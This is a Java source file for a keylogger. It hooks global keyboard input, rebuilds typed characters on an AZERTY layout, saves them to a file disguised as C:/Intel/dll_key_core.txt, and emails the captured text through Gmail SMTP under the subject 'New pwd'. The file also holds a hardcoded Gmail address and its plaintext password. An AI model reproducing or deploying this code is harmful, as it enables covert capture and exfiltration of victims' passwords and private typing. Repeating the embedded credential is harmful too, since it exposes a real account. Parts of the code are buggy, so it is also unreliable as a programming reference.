package com.capture.core;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import com.capture.mail.CrunchifyEmailAPI;

public class Launcher implements NativeKeyListener {
	private int flagNumberCharacterToSend = 0;
	private static String toSend = "";
	private Boolean ctrl = Boolean.valueOf(false);
	private Boolean alt = Boolean.valueOf(false);
	private Boolean arobaze = Boolean.valueOf(false);
	private String keyText = "";
	private Boolean shiftDown = Boolean.valueOf(false);
	private Integer capsLockCount = Integer.valueOf(0);
	private static final File file = new File("C:/Intel/dll_key_core.txt");

	static {
		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		sendEmailSpring("blabla");
//		try {
//			System.out.print("Starting....");
//			GlobalScreen.registerNativeHook();
//		} catch (NativeHookException ex) {
//			System.err.println("There was a problem registering the native hook.");
//			System.err.println(ex.getMessage());
//
//			System.exit(1);
//		}
//		GlobalScreen.getInstance().addNativeKeyListener(new Launcher());
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("code " + e.getKeyCode());

		String nativeKeyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		if ((e.getKeyCode() == 16) || (e.getKeyCode() == 20)) {
			this.shiftDown = Boolean.valueOf(true);
			if (e.getKeyCode() == 20) {
				this.capsLockCount = Integer.valueOf(this.capsLockCount.intValue() + 1);
			}
		}
		if (e.getKeyCode() == 17) {
			this.ctrl = Boolean.valueOf(true);
		}
		if (e.getKeyCode() == 18) {
			this.alt = Boolean.valueOf(true);
		}
		if ((e.getKeyCode() == 48) && (this.ctrl.booleanValue()) && (this.alt.booleanValue())) {
			this.ctrl = Boolean.valueOf(false);
			this.alt = Boolean.valueOf(false);

			this.arobaze = Boolean.valueOf(true);
		}
		if ((e.getKeyCode() == 20) && (this.shiftDown.booleanValue()) && (this.capsLockCount.intValue() % 2 == 0)) {
			nativeKeyText = "ENDCAPS";
			this.shiftDown = Boolean.valueOf(false);
		} else if ((e.getKeyCode() == 20) && (this.capsLockCount.intValue() % 2 != 0)) {
			nativeKeyText = "BEGINCAPS";
		}
		if ((this.shiftDown.booleanValue()) || (this.arobaze.booleanValue())
				|| ((e.getKeyCode() != 16) && (e.getKeyCode() != 17) && (e.getKeyCode() != 18)
						&& (nativeKeyText != "F1") && (nativeKeyText != "F2") && (nativeKeyText != "F3")
						&& (nativeKeyText != "F4") && (nativeKeyText != "F5") && (nativeKeyText != "F6")
						&& (nativeKeyText != "F7") && (nativeKeyText != "F8") && (nativeKeyText != "F9")
						&& (nativeKeyText != "F10") && (nativeKeyText != "F11") && (nativeKeyText != "F12"))) {
			if (this.arobaze.booleanValue()) {
				this.keyText = "@";
				this.arobaze = Boolean.valueOf(false);
			} else {
				try {
					if ((this.shiftDown.booleanValue()) && (e.getKeyCode() != 16) && (e.getKeyCode() != 36)
							&& (e.getKeyCode() != 20) && (e.getKeyCode() != 17)) {
						this.keyText = String.valueOf(StandardKey
								.getKeyByKeyCode(e.getKeyCode(), this.shiftDown.booleanValue(), false).getCharacter());
					} else if ((!this.shiftDown.booleanValue())
							&& (StandardKey.getKeyByKeyCode(e.getKeyCode(), false, false) != null)) {
						this.keyText = String
								.valueOf(StandardKey.getKeyByKeyCode(e.getKeyCode(), false, false).getCharacter());
					} else if ((nativeKeyText != "Maj") && (nativeKeyText != "Ctrl") && (nativeKeyText != "Alt")) {
						this.keyText = nativeKeyText;
					}
				} catch (NullPointerException n) {
					this.keyText = "";
				}
			}
			if (this.keyText.contains("Pavé numérique")) {
				this.keyText = this.keyText.replace("Pavé numérique", "").trim();
			}
			if (this.keyText.contains("Retour arrière")) {
				this.keyText = this.keyText.replace("Retour arrière", "/BackSpace/").trim();
			}
			if (e.getKeyCode() == 16) {
				this.keyText = "";
			}
			if ((e.getKeyCode() == 52) && (!this.shiftDown.booleanValue())) {
				this.keyText = "'";
			}
			if ((this.ctrl.booleanValue()) && (this.alt.booleanValue())) {
				if (e.getKeyCode() == 51) {
					this.keyText = "#";
				}
				if (e.getKeyCode() == 52) {
					this.keyText = "{";
				}
				if (e.getKeyCode() == 53) {
					System.out.println("altgr [");
					this.keyText = "[";
				}
				if (e.getKeyCode() == 54) {
					this.keyText = "|";
				}
				if (e.getKeyCode() == 56) {
					this.keyText = "\\";
				}
				if (e.getKeyCode() == 91) {
					this.keyText = "]";
				}
				if (e.getKeyCode() == 61) {
					this.keyText = "}";
				}
			}

			if (!("ENDCAPS".equals(this.keyText) || "BEGINCAPS".equals(this.keyText)))
				toSend += this.keyText;
				sendEmailSpring(toSend);
//			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 50 == 0)
//		      {
//		        sendToMail(toSend);
//		        
//		        flagNumberCharacterToSend = 0a;
////		        toSend = "";
//		      }
//		      flagNumberCharacterToSend++;
			toSend = removeCaps(toSend);

			writeKeyStrokeToFile(toSend);
		}
	}

	private String removeCaps(String toSend2) {
		if (toSend2.contains("ENDCAPS"))
			toSend2.replaceAll("ENDCAPS", "");
		if (toSend2.contains("BEGINCAPS"))
			toSend2.replaceAll("BEGINCAPS", "");
		return toSend2;
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		if (e.getKeyCode() == 16) {
			this.shiftDown = Boolean.valueOf(false);
		}
		if ((e.getKeyCode() == 17) || (e.getKeyCode() == 18)) {
			System.out.println("release altgr...");
			this.ctrl = Boolean.valueOf(false);
			this.alt = Boolean.valueOf(false);
		}
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}

	private static void writeKeyStrokeToFile(String keyStroke) {
		try {
			BufferedReader bufferedReader = new BufferedReader(new FileReader(file.getAbsolutePath()));

			FileWriter fw = new FileWriter(file.getAbsoluteFile());

			BufferedWriter bw = new BufferedWriter(fw);
			if (bufferedReader.readLine() != null) {
				bw.append(keyStroke);
			} else {
				bw.write(keyStroke);
			}
			bw.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static void sendToMail(String keyStroke) {
		String to = "rantonasoavina@gmail.com";

		String from = "rantonasoavina@gmail.com";
		try {
			String host = "smtp.gmail.com";
			String d_port = "587";

			Properties properties = System.getProperties();

			properties.setProperty("mail.smtp.host", host);
			properties.put("mail.smtp.port", d_port);
			properties.put("mail.smtp.auth", "true");
			properties.put("mail.smtp.starttls.enable", "true");
			properties.put("mail.smtp.socketFactory.port", d_port);
//			properties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
//			properties.put("mail.smtp.socketFactory.fallback", "false");

			// Establishing a session with required user details
			Session session = Session.getInstance(properties, new javax.mail.Authenticator() {
				protected PasswordAuthentication getPasswordAuthentication() {
					return new PasswordAuthentication(from, "I$love$Jesus$Ranto$Nasoavina$2639");
				}
			});

//			Session session = Session.getDefaultInstance(properties, null);
			MimeMessage message = new MimeMessage(session);
			message.setFrom(new InternetAddress(from));
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
			message.setSubject("New pwd");
			message.setText(keyStroke);

//			Transport transport = session.getTransport("smtp");
//			transport.connect(host, Integer.valueOf(d_port).intValue(), from,
//					"I$love$Jesus$Ranto$Nasoavina$2639");
//			transport.sendMessage(message, message.getAllRecipients());
//			transport.close();

//	        try {
//	            //Creating a Message object to set the email content
//	            MimeMessage msg = new MimeMessage(session);
//	            /*Parsing the String with defualt delimiter as a comma by marking the boolean as true and storing the email
//	            addresses in an array of InternetAddress objects*/
//	            InternetAddress[] address = InternetAddress.parse(to, true);
//	            //Setting the recepients from the address variable
//	            msg.setRecipients(Message.RecipientType.TO, address);
//	            String timeStamp = new SimpleDateFormat("yyyymmdd_hh-mm-ss").format(new Date());
//	            msg.setSubject("Sample Mail : " + timeStamp);
//	            msg.setSentDate(new Date());
//	            msg.setText(keyStroke);
//	            msg.setHeader("XPriority", "1");
			Transport.send(message);
//	            System.out.println("Mail has been sent successfully");
//	        } catch (MessagingException mex) {
//	            System.out.println("Unable to send an email" + mex);
//	        }

			System.out.println("Sent message successfully....");
		} catch (MessagingException mex) {
			mex.printStackTrace();
		}
	}
	
	@SuppressWarnings("resource")
	private static void sendEmailSpring(String toSend) {
		// Spring Bean file you specified in /src/main/resources folder
		String crunchifyConfFile = "config_mail.xml";
		ConfigurableApplicationContext context = new ClassPathXmlApplicationContext(crunchifyConfFile);

		// @Service("crunchifyEmail") <-- same annotation you specified in
		// CrunchifyEmailAPI.java
		CrunchifyEmailAPI crunchifyEmailAPI = (CrunchifyEmailAPI) context.getBean("crunchifyEmail");
		String toAddr = "rantonasoavina@gmail.com";
		String fromAddr = "rantonasoavina@gmail.com";

		// email subject
		String subject = "Hey.. This email sent by Crunchify's Spring MVC Tutorial";

		// email body
		String body = toSend;
		crunchifyEmailAPI.crunchifyReadyToSendEmail(toAddr, fromAddr, subject, body);
	}
}
